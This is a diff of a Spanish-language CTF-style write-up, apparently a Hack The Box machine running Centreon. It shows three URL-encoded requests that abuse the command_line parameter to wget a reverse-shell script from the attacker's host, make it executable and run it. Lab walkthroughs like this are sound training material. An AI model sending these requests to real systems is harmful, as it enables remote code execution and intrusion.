@@ -76,16 +76,22 @@ De primeras, crearé un archivo llamado 'shell' con una reverse dentro, comparti
 
 ![image](https://user-images.githubusercontent.com/87484792/184157502-36293fb2-ee1a-4d9f-9c34-5a1b7279e2c5.png)
 
+Guardamos la shell en el directorio /tmp:
+
 `http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http%3A%2F%2F10.10.16.7%2Fshell%20-O%20%2Ftmp%2Fshell&o=p&min=1`
 
 Despues de este paso, queda activarlo para obtener la shell. Ejecutaremos bash.
 Para eso antes, me pondré en escucha por el puerto 8081. Y finalmente, ejecutamos.
 
+otorgamos privilegios de ejecución:
+
 `http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=chmod%20777%20/tmp/shell&o=p&min=1`
+
+ejecutamos:
 
 `http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=bash%20%2Ftmp%2Fshell&o=p&min=1`
 
 ![image](https://user-images.githubusercontent.com/87484792/184162441-79d1070e-8e07-4132-9e59-646d46373b0a.png)
 
 
-
+## Privilegios de Escalados - User & Root
